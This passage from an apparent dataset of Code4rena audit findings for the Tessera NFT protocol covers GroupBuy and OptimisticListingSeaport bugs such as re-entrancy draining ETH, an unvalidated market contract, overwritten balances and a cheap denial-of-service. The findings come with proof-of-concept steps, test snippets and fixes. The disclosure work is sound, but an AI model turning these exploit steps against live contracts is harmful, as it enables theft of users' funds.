      "content": "\n`purchase()` in GroupBuy faciilitates the purchasing of an NFT after enough contributions were gathered. Another report titled *\"Attacker can steal the amount collected so far in the GroupBuy for NFT purchase*\" describes a high impact bug in purchase. It is advised to read that first for context.\n\nAdditionally, `purchase()` is vulnerable to a re-entrancy exploit which can be *chained* or *not chained* to the `\\_market` issue to steal *the entire* ETH stored in GroupBuy, rather than being capped to `minReservePrices[_poolId] * filledQuantities[_poolId]`.\n\nAttacker may take control of execution using this call:\n\n    // Executes purchase order transaction through market buyer contract and deploys new vault\n    address vault = IMarketBuyer(_market).execute{value: _price}(_purchaseOrder);\n\nIt could occur either by exploiting the unvalidated `\\_market` vulnerability , or by abusing an existing market that uses a user address in `\\_purchaseOrder`.\n\nThere is no re-entrancy protection in `purchase()` call:\n\n    function purchase(\n        uint256 _poolId,\n        address _market,\n        address _nftContract,\n        uint256 _tokenId,\n        uint256 _price,\n        bytes memory _purchaseOrder,\n        bytes32[] memory _purchaseProof\n    ) external {\n\n`\\_verifyUnsuccessfulState()` needs to not revert for purchase call. It checks the pool.success flag:\n`if (pool.success || block.timestamp > pool.terminationPeriod) revert InvalidState();`\n\nHowever, success is only set as the last thing in `purchase()`:\n\n        // Stores mapping value of poolId to newly deployed vault\n        poolToVault[_poolId] = vault;\n        // Sets pool state to successful\n        poolInfo[_poolId].success = true;\n        // Emits event for purchasing NFT at given price\n        emit Purchase(_poolId, vault, _nftContract, _tokenId, _price);\n    }\n\nTherefore, attacker can re-enter purchase() function multiple times, each time extracting the maximum allowed price. If attacker uses the controlled `\\_market` exploit, the function will return the current NFT owner, so when all the functions unwind they will keep setting success to true and exit nicely.\n\n### Impact\n\nGroupBuy can be drained of all ETH.\n\n### Proof of Concept\n\n1.  GroupBuy holds 1500 ETH, from various bids\n2.  maximum allowed price (`minReservePrices[_poolId] * filledQuantities[_poolId]`) is 50 &ast; 20 = 1000 ETH\n3.  purchase(1000 ETH) is called\n    1.  GroupBuy sends attacker 1000 ETH and calls `execute()`\n        1.  `execute()` calls purchase(500ETH)\n            1.  GroupBuy sends attacker 500 ETH and calls `execute()`\n                1.  execute returns NFT owner address\n            2.  GroupBuy sees returned address is NFT owner. Marks success and returns\n        2.  execute returns NFT owner address\n    2.  GroupBuy sees returned address is NFT owner. Marks success and returns\n4.  Attacker is left with 1500 ETH. Previous exploit alone can only net 1000ETH. Additionally, this exploit can be chained to any trusted MarketBuyer which passes control to user for purchasing and storing in vault, and then returns a valid vault.\n\n### Recommended Mitigation Steps\n\nAdd a re-entrancy guard to `purchase()` function. Also, change success variable before performing external contract calls.\n\n**[mehtaculous (Tessera) confirmed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/52#issuecomment-1370077960):**\n > Agree with High severity. Instead of adding `re-entrancy` tag to `purchase` function, pool state simply needs to be updated to `success` before execution.\n> \n> In regards to:\n> > or by abusing an existing market that uses a user address in _purchaseOrder.\n> \n> This is not considered an issue since users will most likely NOT contribute to a pool where they are not familiar with the NFT and / or contract. Since the NFT contract is set when the pool is created, it should not matter whether the contract is malicious or is for an existing market that uses a user address, the pool will just be disregarded.\n\n**[stevennevins (Tessera) mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/52#issuecomment-1404413680):**\n > https://github.com/fractional-company/modular-fractional/pull/201\n>\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/48), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/28), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/10).\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the purchase() function of the GroupBuy smart contract. The purchase() function is used to facilitate the purchasing of an NFT when enough contributions are gathered. This vulnerability allows an attacker to exploit the purchase() function to steal the entire ETH stored in GroupBuy, rather than being capped to the minReservePrices[_poolId] * filledQuantities[_poolId]. \n\nThe vulnerability occurs because there is no re-entrancy protection in the purchase() function, and the success variable is set as the last thing in the function, allowing an attacker to re-enter the purchase() function multiple times, each time extracting the maximum allowed price. If the attacker uses a controlled exploit, the function will return the current NFT owner, so when all the functions unwind they will keep setting success to true and exit nicely.\n\nThe impact of this vulnerability is that GroupBuy can be drained of all ETH. A proof of concept is provided, which shows that the attacker can be left with 1500 ETH, which is more than the maximum allowed price of 1000 ETH.\n\nThe recommended mitigation steps for this vulnerability are to add a re-entrancy guard to the purchase() function and to change the success variable before performing external contract calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/52",
      "tags": [],
      "finders": [
        "Lambda",
        "Trust"
      ]
    },
    {
      "id": "12202",
      "title": "[H-08] Attacker can steal the amount collected so far in the GroupBuy for NFT purchase.",
      "impact": "HIGH",
      "content": "\n`purchase()` in GroupBuy.sol executes the purchase call for the group. After safety checks, the NFT is bought with `\\_market`'s `execute()` function. Supposedly it deploys a vault which owns the NFT. The code makes sure the vault is the new owner of the NFT and exits.\n\n    // Executes purchase order transaction through market buyer contract and deploys new vault\n    address vault = IMarketBuyer(_market).execute{value: _price}(_purchaseOrder);\n    // Checks if NFT contract supports ERC165 and interface ID of ERC721 tokens\n    if (ERC165Checker.supportsInterface(_nftContract, _INTERFACE_ID_ERC721)) {\n        // Verifes vault is owner of ERC-721 token\n        if (IERC721(_nftContract).ownerOf(_tokenId) != vault) revert UnsuccessfulPurchase();\n    } else {\n        // Verifies vault is owner of CryptoPunk token\n        if (ICryptoPunk(_nftContract).punkIndexToAddress(_tokenId) != vault)\n            revert UnsuccessfulPurchase();\n    }\n\n    // Stores mapping value of poolId to newly deployed vault\n    poolToVault[_poolId] = vault;\n    // Sets pool state to successful\n    poolInfo[_poolId].success = true;\n    // Emits event for purchasing NFT at given price\n    emit Purchase(_poolId, vault, _nftContract, _tokenId, _price);\n\nThe issue is that `\\_market` user-supplied variable is not validated at all. Attacker can pass their malicious contract, which uses the passed funds to buy the NFT and store it in attacker's wallet. It will return the NFT-holding wallet so the checks will pass. As a result, attacker has the NFT while they could have contributed nothing to the GroupBuy. Attacker can also just steal the supplied ETH and return the current address which holds the NFT.\n\n### Impact\n\nAttacker can steal the amount collected so far in the GroupBuy for NFT purchase.\n\n### Proof of Concept\n\n1.  Group assembles and raises funds to buy NFT X\n2.  Attacker calls `purchase()` and supplies their malicious contract in `\\_market`, as described.\n3.  Attacker receives raised funds totalling  `minReservePrices[_poolId] * filledQuantities[_poolId]`, as checked in line 182.\n\n### Recommended Mitigation Steps\n\n`\\_market` should be whitelisted, or supplied in createPool stage and able to be scrutinized.\n\n**[mehtaculous (Tessera) confirmed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/47#issuecomment-1370123421):**\n > Agree with High severity. Solution is to check that the `vault` deployed from the MarketBuyer is actually registered through the `VaultRegistry`. This would confirm that the vault is not a user address\n\n**[stevennevins (Tessera) mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/47#issuecomment-1404413419):**\n > https://github.com/fractional-company/modular-fractional/pull/201\n\n**Status:** Mitigation not confirmed.  Full details in [report from gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/47), and also included in the Mitigation Review section below.\n\n***\n\n",
      "summary": "\nThis bug report is about the purchase() function in GroupBuy.sol. The function is used to execute the purchase call for the group and deploy a vault that owns the Non-Fungible Token (NFT). However, the \\_market user-supplied variable is not validated at all, which allows an attacker to pass their malicious contract. This malicious contract uses the passed funds to buy the NFT and store it in the attacker's wallet, while the checks will still pass. As a result, the attacker will have the NFT while they did not contribute anything to the GroupBuy. The attacker can also just steal the supplied ETH and return the current address which holds the NFT. \n\nThe impact of this vulnerability is that the attacker can steal the amount collected so far in the GroupBuy for NFT purchase. The proof of concept for this bug is that the Group assembles and raises funds to buy NFT X, then the attacker calls purchase() and supplies their malicious contract in \\_market. As a result, the attacker receives raised funds totalling  `minReservePrices[_poolId] * filledQuantities[_poolId]`, as checked in line 182. \n\nThe recommended mitigation steps for this bug is to whitelist \\_market, or supply it in the createPool stage and allow it to be scrutinized.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/47",
      "tags": [],
      "finders": [
        "IllIllI  Lambda",
        "Trust"
      ]
    },
    {
      "id": "12201",
      "title": "[H-07] User loses collateral converted to pendingBalance when cash() or list() is called",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L295\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L232\n\n\n## Vulnerability details\n\n## Description\n\nIn OptimisticListingOpensea, there are several functions which update pendingBalances of a proposer:\n1. list()\n2. cash()\n3. propose()\n\nUnfortunately, in list() and cash() the = operator is used instead of += when writing the new pendingBalances. For example:\n```\nfunction cash(address _vault, bytes32[] calldata _burnProof) external {\n    // Reverts if vault is not registered\n    (address token, uint256 id) = _verifyVault(_vault);\n    // Reverts if active listing has not been settled\n    Listing storage activeListing = activeListings[_vault];\n    // Reverts if listing has not been sold\n    if (!_verifySale(_vault)) {\n        revert NotSold();\n    } else if (activeListing.collateral != 0) {\n        uint256 collateral = activeListing.collateral;\n        activeListing.collateral = 0;\n        // Sets collateral amount to pending balances for withdrawal\n        pendingBalances[_vault][activeListing.proposer] = collateral;\n    }\n\t...\n```\n\npendingBalances is not guaranteed to be zero. There could be funds from previous proposals which are not yet collected. Propose updates pendingBalance correctly:\n```\n// Sets collateral amount to pending balances for withdrawal\npendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral;\n```\n\nSo, when propose is followed by another propose(), the pendingBalance is updated correctly, but in cash and list we don't account for pre-existing balance. This issue would manifest even after the fix suggested in the issue \"User can send a proposal and instantly take back their collateral\" because reject functions would increment the pendingBalance and then it would be overriden.\n\n## Impact\n\nUser loses collateral converted to pendingBalance when cash() or list() is called\n\n## Proof of Concept\n\n1. User calls propose() and gets pendingBalance = x\n2. User calls propose() with an improved proposal and gets pendingBalance = 1.5x\n3. proposal is successfull and the listing purchased the NFT\n4. cash() is called to convert the Raes to ETH amount from the sell. pendingBalance is overridden by the current \"collateral\"  value. pendingBalance = 0.5x\n5. User loses x collateral value which is stuck in the contract\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nChange the = operator to += in list() and cash().",
      "summary": "\nThis bug report concerns the OptimisticListingOpensea contract, which contains several functions that update the pendingBalances of a proposer. In the list() and cash() functions, the = operator is used instead of += when writing the new pendingBalances. This means that pre-existing balances are not taken into account, and a user can lose collateral that has been converted to pendingBalance when cash() or list() is called. \n\nProof of concept involves a user calling propose(), then calling propose() again with an improved proposal and getting a pendingBalance of 1.5x. The proposal is then successful, and the listing is purchased. When cash() is called to convert the Raes to ETH amount from the sell, the pendingBalance is overridden by the current \"collateral\" value, resulting in the user losing the x collateral value that was stuck in the contract.\n\nThe recommended mitigation steps for this bug are to change the = operator to += in list() and cash().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/44",
      "tags": [],
      "finders": [
        "Lambda",
        "Trust"
      ]
    },
    {
      "id": "12200",
      "title": "[H-06] Funds are permanently stuck in OptimisticListingSeaport.sol contract if active proposal is executed after new proposal is pending.",
      "impact": "HIGH",
      "content": "\n`\\_constructOrder` is called in `propose()`, OptimisticListingSeaport.sol. It fills the order params stored in proposedListings\\[\\_vault].\n\n    {\n        orderParams.offerer = _vault;\n        orderParams.startTime = block.timestamp;\n        // order doesn't expire in human time scales and needs explicit cancellations\n        orderParams.endTime = type(uint256).max;\n        orderParams.zone = zone;\n        // 0: no partial fills, anyone can execute\n        orderParams.orderType = OrderType.FULL_OPEN;\n        orderParams.conduitKey = conduitKey;\n        // 1 Consideration for the listing itself + 1 consideration for the fees\n        orderParams.totalOriginalConsiderationItems = 3;\n    }\n\nImportantly, it updates the order hash associated with the vault:\n`vaultOrderHash[_vault] = _getOrderHash(orderParams, counter);`\n\nThere is only one other use of `vaultOrderHash`, in `\\_verifySale()`.\n\n    function _verifySale(address _vault) internal view returns (bool status) {\n        (bool isValidated, bool isCancelled, uint256 totalFilled, uint256 totalSize) = ISeaport(\n            seaport\n        ).getOrderStatus(vaultOrderHash[_vault]);\n        if (isValidated && !isCancelled && totalFilled > 0 && totalFilled == totalSize) {\n            status = true;\n        }\n    }\n\nThis function gets order information from the order hash, and makes sure the order is completely fulfilled.\n\nAfter NFT sell has completed, `cash()` is used to distribute income ETH:\n\n    function cash(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if vault is not registered\n        (address token, uint256 id) = _verifyVault(_vault);\n        // Reverts if active listing has not been settled\n        Listing storage activeListing = activeListings[_vault];\n        // Reverts if listing has not been sold\n    \t  // -------------- _verifySale MUST BE TRUE ---------\n        if (!_verifySale(_vault)) {\n            revert NotSold();\n        } else if (activeListing.collateral != 0) {\n            uint256 collateral = activeListing.collateral;\n            activeListing.collateral = 0;\n            // Sets collateral amount to pending balances for withdrawal\n            pendingBalances[_vault][activeListing.proposer] = collateral;\n        }\n\nAs long as sale is not complete, `cash()` can't be called as highlighted. The issue is that `vaultOrderHash[_vault]` is not protected during the lifetime of an active proposal. If another proposal is proposed and then the sell using active proposal takes place, `cash()` will keep reverting. Funds are stuck in listing contract.\n\nWe can try to be clever and call `propose()` again with the same parameters to create an identical orderID, which will make `vaultOrderHash[_vault]` fine again and allow `cash()` to go through. But order params contain block.timestamp which will certainly be different which will make the hash different.\n\n### Impact\n\nFunds are permanently stuck in OptimisticListingSeaport.sol contract if active proposal is executed after new proposal is pending.\n\n### Proof of Concept\n\n1.  User A calls `propose()`, setting proposedListing. vaultOrderHash=X\n2.  PROPOSAL_PERIOD passes , list is called promoting the listing to activeListing.\n3.  Another user, malicious or innocent, proposes another proposal. vaultOrderHash=Y\n4.  Sell goes down due to OpenSea validation confirmed on activeListing.\n5.  `\\_verifySale` will never return true because we can never got vaultOrderHash to be X\n6.  cash() is bricked. Money is stuck in contract.\n\n### Recommended Mitigation Steps\n\nKeep the order hash in the Listing structure rather than a single one per vault.\n\n**[mehtaculous (Tessera) confirmed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/43#issuecomment-1370140203):**\n > Agree with High severity. Solution is to move `orderHash` to Listing struct so that active and proposed listings can have separate order hashes.\n\n**[stevennevins (Tessera) mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/43#issuecomment-1404412211):**\n > https://github.com/fractional-company/modular-fractional/pull/211\n>\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/45), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/25), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/7).\n\n***\n\n",
      "summary": "\nA bug has been found in the OptimisticListingSeaport.sol contract of the code-423n4/2022-12-tessera repository. The bug occurs when a proposed listing is executed after a new proposal has been made. The order params stored in proposedListings[_vault] are updated in the _constructOrder() function, including the order hash associated with the vault. This order hash is used in the _verifySale() function to check if the order is completely fulfilled. If it is not, cash() is blocked and the funds are stuck in the contract. \n\nThis bug can be exploited by a malicious user who can call propose() again with the same parameters to create an identical orderID, which will make vaultOrderHash[_vault] fine again and allow cash() to go through. However, this will not work as order params contain block.timestamp which will be different, making the hash different.\n\nThe impact of this bug is that funds are permanently stuck in OptimisticListingSeaport.sol contract if an active proposal is executed after a new proposal is pending. A manual audit was used to identify the bug.\n\nThe recommended mitigation step is to keep the order hash in the Listing structure rather than a single one per vault.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/43",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "12199",
      "title": "[H-05] Attacker can DOS OptimisticListing with very low cost",
      "impact": "HIGH",
      "content": "\nThe only check on a new proposal is that it is priced lower than the existing proposal. It does not constrain on the `_collateral` supplied (except it will revert in `\\_verifyBalance` if set to 0). Anyone can block normal proposal creation by creating a proposal with lower price but `\\_collateral == 1`. When a high total supply is used, the price of each Rae is negligible and enables an attacker to DOS the protocol.\n\nThis violated the `prevent a user from holding a vault hostage and never letting the piece be reasonably bought` requirement.\n\n### Proof of Concept\n\nFor any proposal, an attacker can deny it with `\\_collateral = 1` and `\\_price = price - 1`.\n\nIf he does not want the NFT to be sold, he can reject the proposal himself, resetting the contract state.\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L112-L116>\n\n```solidity\n        // Reverts if price per token is not lower than both the proposed and active listings\n        if (\n            _pricePerToken >= proposedListing.pricePerToken ||\n            _pricePerToken >= activeListings[_vault].pricePerToken\n        ) revert NotLower();\n```\n\nAdd this test to OptimisticListingSeaport.t.sol:\n\n        function testProposeRevertLowerTotalValue() public {\n            uint256 _collateral = 100;\n            uint256 _price = 100;\n            // setup\n            testPropose(_collateral, _price);\n            lowerPrice = pricePerToken - 1;\n            // execute\n            vm.expectRevert();\n            _propose(eve, vault, 1, lowerPrice, offer);\n            // expect\n            _assertListing(eve, 1, lowerPrice, block.timestamp);\n            _assertTokenBalance(eve, token, tokenId, eveTokenBalance - 1);\n        }\n\n\\[FAIL. Reason: Call did not revert as expected]\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nRequire the total value of the new collateral to be greater than the previous.\n\nThis however still allows a Rae holder with sufficiently large holding to block proposal by creating a new proposal and immediately reject it himself.\n\n**[stevennevins (Tessera) confirmed](https://github.com/code-423n4/2022-12-tessera-findings/issues/25#issuecomment-1371409906)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/25#issuecomment-1378890797):**\n > Best report for Foundry POC + the following statement:\n> > This violated the `prevent a user from holding a vault hostage and never letting the piece be reasonably bought` requirement.\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a protocol called Tessera. The vulnerability allows an attacker to block normal proposal creation by creating a proposal with a lower price but _collateral == 1. This violates the “prevent a user from holding a vault hostage and never letting the piece be reasonably bought” requirement. The vulnerability was found using Foundry, a tool used to find and report bugs. The recommended mitigation step is to require the total value of the new collateral be greater than the previous. This would still, however, allow a Rae holder with a sufficiently large holding to block proposal by creating a new proposal and immediately reject it himself.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/25",
      "tags": [],
      "finders": [
        "cccz",
        "Trust",
        "gzeon"
      ]
    },
    {
      "id": "12198",
      "title": "[H-04] OptimisticListingSeaport.propose sets pendingBalances of newly added proposer instead of previous one",
      "impact": "HIGH",
      "content": "\nIn `OptimisticListingSeaport.propose`, `pendingBalances` is set to the collateral. The purpose of this is that the proposer of a previous proposal can withdraw his collateral afterwards. However, this is done on the storage variable `proposedListing` after the new listing is already set:\n\n```solidity\n_setListing(proposedListing, msg.sender, _collateral, _pricePerToken, block.timestamp);\n\n// Sets collateral amount to pending balances for withdrawal\npendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral;\n```\n\nBecause of that, it will actually set `pendingBalances` of the new proposer. Therefore, the old proposer loses his collateral and the new one can make proposals for free.\n\n### Proof Of Concept\n\n```diff\n--- a/test/seaport/OptimisticListingSeaport.t.sol\n+++ b/test/seaport/OptimisticListingSeaport.t.sol\n@@ -379,8 +379,11 @@ contract OptimisticListingSeaportTest is SeaportTestUtil {\n     /// ===== LIST =====\n     /// ================\n     function testList(uint256 _collateral, uint256 _price) public {\n         // setup\n         testPropose(_collateral, _price);\n+        assertEq(optimistic.pendingBalances(vault, bob), 0);\n         _increaseTime(PROPOSAL_PERIOD);\n         _collateral = _boundCollateral(_collateral, bobTokenBalance);\n         _price = _boundPrice(_price);\n```\n\nThis test fails and `optimistic.pendingBalances(vault, bob)` is equal to `_collateral`.\n\n### Recommended Mitigation Steps\n\nRun `pendingBalances[_vault][proposedListing.proposer] += proposedListing.collateral;` before the `_setListing` call, in which case the above PoC no longer works.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/12#issuecomment-1358744847):**\n > > Because of that, it will actually set pendingBalances of the new proposer. Therefore, the old proposer loses his collateral and the new one can make proposals for free.\n> \n> Seems like intended behaviour to me (actually set pendingBalances of the new proposer). The old proposer wouldn't be losing his collateral because his pendingBalances would've been set when he called `propose()`.\n\n**[mehtaculous (Tessera) confirmed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/12#issuecomment-1371507827):**\n > Agree with severity. The suggested solution makes sense.\n\n**[stevennevins (Tessera) mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/12#issuecomment-1404411097):**\n > https://github.com/fractional-company/modular-fractional/pull/202\n>\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/42), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/23), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/5).\n\n***\n\n",
      "summary": "\nThis report describes a bug found in the code of a specific GitHub repository. The bug allows the proposer of a previous proposal to lose their collateral, while the new proposer can make proposals for free. The bug is demonstrated in a proof of concept code snippet, which fails and shows that the proposed collateral is not set to the old proposer, but to the new one. The recommended mitigation step for this bug is to run the proposed collateral line of code before the _setListing call. This way, the bug will no longer work.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/12",
      "tags": [],
      "finders": [
        "Lambda",
        "Trust"
      ]
    },
    {
      "id": "12197",
      "title": "[H-03] Groupbuy:_verifyUnsuccessfulState and _verifySuccessfulState both can return true when block.timestamp == pool.terminationPeriod",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L455\nhttps://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L478\n\n\n## Vulnerability details\n\n## Impact\nThe functions `_verifyUnsuccessfulState` and `_verifySuccessfulState` should always have a differing behavior with regards to reversion, i.e. when one does not revert, the other should revert. In one condition, this is not true. Namely, when we have `pool.success == false` and `block.timestamp == pool.terminationPeriod`, this check within `_verifyUnsuccessfulState` is `false`:\n```solidity\nif (pool.success || block.timestamp > pool.terminationPeriod) revert InvalidState();\n```\nSimilarly, this check within `_verifySuccessfulState` is also `false`:\n```solidity\nif (!pool.success && block.timestamp < pool.terminationPeriod) revert InvalidState();\n```\nBecause this breaks a fundamental invariant of the contract, there are probably multiple ways to exploit it. \nOne way an attacker can exploit is by calling `claim` (to get his contribution back completely), bidding again with a higher value than his previous contributions (to get his contributions back again).\n\n## Proof Of Concept\nLet's assume we are at timestamp `pool.terminationPeriod`. Attacker Charlie has performed the lowest bid with quantity 10 and price 1 ETH. He calls `claim` to get his 10 ETH back. Now, he calls `contribute` with a quantity of 10 and a price of 2 ETH. Because this bid is higher than his previous one (which was the lowest one), his `pendingBalances` is set to 10 ETH (for the deleted entries) and his `userContributions` is set to 20 ETH (for this new contribution). He can now call `claim` again to get back his 20 ETH in `userContributions`, but also the 10 ETH in `pendingBalances`. Like that, he has stolen 10 ETH (and could use this attack pattern to drain the whole contract).\n\n## Recommended Mitigation Steps\nChange `<` in `_verifySuccessfulState` to `<=`.",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract called Group Buy. This vulnerability affects the functions _verifyUnsuccessfulState and _verifySuccessfulState, which should always have a different behavior with regards to reversion. In one condition, this is not true, allowing an attacker to exploit the vulnerability and steal Ether. \n\nThe proof of concept shows that if the attacker calls the function ‘claim’ to get his contribution back, then calls ‘contribute’ with a higher value than his previous contribution, he can call ‘claim’ again to get back his Ether. This allows him to steal Ether from the contract. \n\nThe recommended mitigation step is to change the ‘<’ in _verifySuccessfulState to ‘<=’. This will ensure that the functions _verifyUnsuccessfulState and _verifySuccessfulState have different behavior with regards to reversion, thus preventing the vulnerability from being exploited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/10",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "12196",
      "title": "[H-02] GroupBuy: Lost ETH when the NFT is bought for less than the minimum reserve price",
      "impact": "HIGH",
      "content": "\nThe `purchase` function does not require that an NFT is bought for exactly `minReservePrices[_poolId] * filledQuantities[_poolId]`, the price is only not allowed to be greater:\n\n```solidity\nif (_price > minReservePrices[_poolId] * filledQuantities[_poolId])\n            revert InvalidPurchase();\n```\n\nThis makes sense because it is not sensible to pay more when the purchase also succeeds with a smaller amount. However, the logic within `claim` does assume that the NFT was bought for `minReservePrices[_poolId]`. It decreases from `contribution` the quantity times the reserve price for all bids:\n\n```solidity\ncontribution -= quantity * reservePrice;\n```\n\nOnly the remaining amount is reimbursed to the user, which can lead to a loss of funds.\n\n### Proof Of Concept\n\nLet's say that `filledQuantities[_poolId] = 100` and `minReservePrices[_poolId]` (i.e., the lowest bid) was 1 ETH. However, it was possible to buy the NFT for only 50 ETH. When a user has contributed 20 &ast; 1 ETH, he does not get anything back when calling `claim`, although only 10 ETH (0.5 ETH &ast; 20) of his contributions were used to buy the NFT. The overall loss of funds for all contributors is 50 ETH.\n\n### Recommended Mitigation Steps\n\nSet `minReservePrices[_poolId]` to `_price / filledQuantities[_poolId]` after a purchase.\n\n**[stevennevins (Tessera) disagreed with severity and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/7#issuecomment-1371404170):**\n > Not sure I agree with the severity.  The mechanism is essentially users pre-state their X interest at Y quantity and so a user can never \"pay\" at a price greater than they essentially agreed to.  We will look into ways to better handle the change and as it related to [#19](https://github.com/code-423n4/2022-12-tessera-findings/issues/19). I would mark this as Medium.\n\n**[mehtaculous (Tessera) confirmed](https://github.com/code-423n4/2022-12-tessera-findings/issues/7#issuecomment-1371512844)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/7#issuecomment-1378146079):**\n > Funds are considered lost if the NFT was bought at a discounted price, and cannot be recovered, right? Would keep at High severity if it's the case.\n\n**[stevennevins (Tessera) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/7#issuecomment-1381955503):**\n > Yeah correct, confirmed.\n\n**[stevennevins (Tessera) mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/7#issuecomment-1404414898):**\n > https://github.com/fractional-company/modular-fractional/pull/207\n\n**Status:** Mitigation not confirmed.  Full details in reports from [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/40) and  [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/21). Also included in Mitigation Review section below.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the purchase and claim functions of the GroupBuy.sol smart contract. The purchase function does not require that an NFT is bought for exactly `minReservePrices[_poolId] * filledQuantities[_poolId]` and can be bought for a lower amount. This can lead to a loss of funds when the claim function assumes that the NFT was bought for `minReservePrices[_poolId]` and reduces the contribution from the user by the quantity times the reserve price for all bids. \n\nFor example, if `filledQuantities[_poolId] = 100` and `minReservePrices[_poolId]` was 1 ETH, but the NFT was bought for only 50 ETH, when a user has contributed 20 * 1 ETH, he does not get anything back when calling `claim`, although only 10 ETH (0.5 ETH * 20) of his contributions were used to buy the NFT. The overall loss of funds for all contributors is 50 ETH.\n\nThe recommended mitigation step is to set `minReservePrices[_poolId]` to `_price / filledQuantities[_poolId]` after a purchase.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/7",
      "tags": [],
      "finders": [
        "Lambda",
        "gzeon"
      ]
    },
    {
      "id": "12195",
      "title": "[H-01] GroupBuy does not check return value of call",
      "impact": "HIGH",
